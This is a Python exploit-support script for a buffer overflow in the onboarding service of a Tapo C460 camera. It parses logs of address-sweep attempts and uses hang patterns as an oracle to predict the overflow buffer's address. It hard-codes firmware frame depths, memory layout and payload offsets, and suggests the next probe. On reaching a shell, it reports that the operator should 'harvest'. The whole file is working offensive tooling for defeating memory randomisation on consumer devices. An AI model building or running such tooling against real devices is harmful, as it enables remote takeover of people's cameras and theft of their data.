#!/usr/bin/env python3
"""Read a C460 stack sweep log and predict the buffer address from the hang pattern.

The oracle (docs/exploit/tapo-onboarding-overflow.md §10): the payload is written *upward* from the
saved-pc buffer, so a guess that lands in the buffer neighbourhood makes the decoder run into our
bytes and never return — an 8 s empty reply, the "DECODE-BUFFER zone". A guess outside it crashes
or errors. The buffer therefore sits at the **top** of a hang run, one frame depth below the thread
stack top; the transition out of the run bounds it from below.

Frame depth is fixed by the firmware, not guessed: entry frame 356 B + accept frame 64 B + handler
frame 0x740 = 0x8E4 (2276 B), which is the "~1.5 KB below the stack top" of §10.

  tapo_sweep_analyzer.py /tmp/c460_sweep2.log
  tapo_sweep_analyzer.py --json /tmp/c460_sweep2.log

Exit: 0 a prediction was produced · 1 the log holds no usable transition · 2 no steps parsed.
"""
from __future__ import annotations

import argparse
import json
import re
import sys

# §10 constants. The oracle is only meaningful with these; they are not tunables.
FRAME_DEPTH = 0x8E4          # entry 356 + accept 64 + handler 0x740
MMAP_BASE = 0xB7000000       # arch_pick_mmap_layout: STACK_TOP - SZ_128M - rnd
RANDOMISATION = 0x100000     # up to ~1 MB
WINDOW = 0x500               # 1.3 KB payload window (§10 sweep economics)
OFFSET = 1060                # confirmed on the C460 (and on .4.71)

LINE = re.compile(r"^(?P<t>\d\d:\d\d:\d\d)\s+addr=(?P<addr>0x[0-9a-fA-F]+)\s+::\s+"
                  r"(?P<dur>[\d.]+)s\s+(?P<rest>.*)$")


def classify(rest: str) -> str:
    low = rest.lower()
    if "shell" in low and "no shell" not in low:
        return "SHELL"
    if "decode-buffer" in low or "no shell" in low:
        return "HANG"
    if "crash" in low or "refused" in low or "timeout" in low:
        return "CRASH"
    return "UNKNOWN"


def parse(path: str) -> list[dict]:
    steps = []
    with open(path, errors="replace") as fh:
        for line in fh:
            m = LINE.match(line.strip())
            if not m:
                continue
            steps.append({"t": m["t"], "addr": int(m["addr"], 16),
                          "dur": float(m["dur"]), "kind": classify(m["rest"])})
    steps.sort(key=lambda s: s["addr"])
    return steps


def runs(steps: list[dict], kind: str, step: int) -> list[list[dict]]:
    """Contiguous runs of `kind`, tolerating one missing step between members."""
    out, cur = [], []
    for s in steps:
        if s["kind"] == kind:
            if cur and s["addr"] - cur[-1]["addr"] > 2 * step:
                out.append(cur)
                cur = []
            cur.append(s)
        elif cur:
            out.append(cur)
            cur = []
    if cur:
        out.append(cur)
    return out


def analyse(steps: list[dict]) -> dict:
    if not steps:
        return {"verdict": "no-steps"}
    addrs = [s["addr"] for s in steps]
    step = min((b - a for a, b in zip(addrs, addrs[1:]) if b > a), default=0x400)

    shells = [s for s in steps if s["kind"] == "SHELL"]
    if shells:
        return {"verdict": "shell", "addr": shells[0]["addr"], "step": step,
                "note": "shell already obtained — harvest, do not sweep"}

    hangs = runs(steps, "HANG", step)
    if not hangs:
        return {"verdict": "no-hang", "step": step,
                "note": "no hang anywhere in the log: the whole range is outside the buffer "
                        "neighbourhood — the walk is in the wrong region"}

    top = max(r[-1]["addr"] for r in hangs)
    bottom = min(r[0]["addr"] for r in hangs)
    edges = 0
    # a transition is only evidence when a non-hang step exists on that side
    if any(s["kind"] != "HANG" and s["addr"] > top for s in steps):
        edges += 1
    if any(s["kind"] != "HANG" and s["addr"] < bottom for s in steps):
        edges += 1

    predicted = top - FRAME_DEPTH
    if not (bottom <= predicted <= top):
        predicted = top - step // 2
    confidence = ("high" if edges == 2 else "medium" if edges == 1 else "low")
    return {
        "verdict": "predicted",
        "addr": predicted,
        "top_edge": top,
        "bottom_edge": bottom,
        "hang_steps": sum(len(r) for r in hangs),
        "edges_bounded": edges,
        "confidence": confidence,
        "step": step,
        "frame_depth": FRAME_DEPTH,
        "next_probe": predicted,
        "next_step": min(step, 0x100),
        "note": ("top edge is the stack top; the buffer is one frame depth below it"
                 if edges else
                 "every step hangs: the top edge is above the log — walk UP to find it first"),
    }


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("log", nargs="?", default="/tmp/c460_sweep2.log")
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args()
    try:
        steps = parse(a.log)
    except OSError as exc:
        print(f"cannot read {a.log}: {exc}", file=sys.stderr)
        return 2
    if not steps:
        print(f"no sweep steps parsed from {a.log}", file=sys.stderr)
        return 2

    res = analyse(steps)
    if a.json:
        print(json.dumps(dict(res, steps=len(steps), offset=OFFSET,
                              mmap_base=hex(MMAP_BASE), randomisation=RANDOMISATION,
                              window=WINDOW), indent=1))
    else:
        counts = {}
        for s in steps:
            counts[s["kind"]] = counts.get(s["kind"], 0) + 1
        print(f"{len(steps)} steps from {a.log}: " +
              ", ".join(f"{k}={v}" for k, v in sorted(counts.items())))
        print(f"range 0x{min(s['addr'] for s in steps):x}..0x{max(s['addr'] for s in steps):x}, "
              f"step 0x{res['step']:x}")
        if res["verdict"] == "predicted":
            print(f"hang run 0x{res['bottom_edge']:x}..0x{res['top_edge']:x} "
                  f"({res['hang_steps']} steps, {res['edges_bounded']} edge(s) bounded)")
            print(f"PREDICTED buffer 0x{res['addr']:x} (confidence {res['confidence']})")
            print(f"next probe 0x{res['next_probe']:x} step 0x{res['next_step']:x}")
        print(res["note"])
    return 0 if res["verdict"] in ("predicted", "shell") else 1


if __name__ == "__main__":
    sys.exit(main())
